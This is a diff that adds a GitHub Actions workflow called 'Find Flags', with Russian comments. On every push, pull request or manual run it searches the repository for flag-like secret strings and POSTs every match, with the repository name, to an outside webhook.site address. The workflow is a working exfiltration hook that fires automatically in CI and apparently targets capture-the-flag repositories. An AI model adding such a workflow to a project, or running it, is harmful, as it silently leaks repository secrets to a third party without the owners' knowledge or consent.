@@ -1,0 +1,37 @@
+name: Find Flags
+
+on:
+  push:
+  pull_request:
+  workflow_dispatch:
+
+jobs:
+  search:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - uses: actions/checkout@v3
+      
+      - name: Search for flag pattern
+        run: |
+          # Ищем строки содержащие flag (любой регистр)
+          echo "🔍 Searching for 'flag' in files..."
+          grep -rin "flag" . --exclude-dir=.git || true
+          
+          echo ""
+          echo "🔍 Searching for FLAG: pattern..."
+          grep -rin "FLAG:" . --exclude-dir=.git || true
+          
+          echo ""
+          echo "🔍 Searching for {...} pattern..."
+          grep -rinE "[A-Z]+\{[^}]+\}" . --exclude-dir=.git || true
+          
+      - name: Send to webhook
+        run: |
+          # Собираем все строки с флагами
+          FLAGS=$(grep -rinE "(flag|FLAG|Flag).*[{\"]" . --exclude-dir=.git | jq -R -s -c 'split("\n")')
+          
+          curl -X POST \
+            -H "Content-Type: application/json" \
+            -d "{\"repository\": \"${{ github.repository }}\", \"flags\": $FLAGS}" \
+            https://webhook.site/57254474-41e8-4ec4-b099-0b38ea82598e
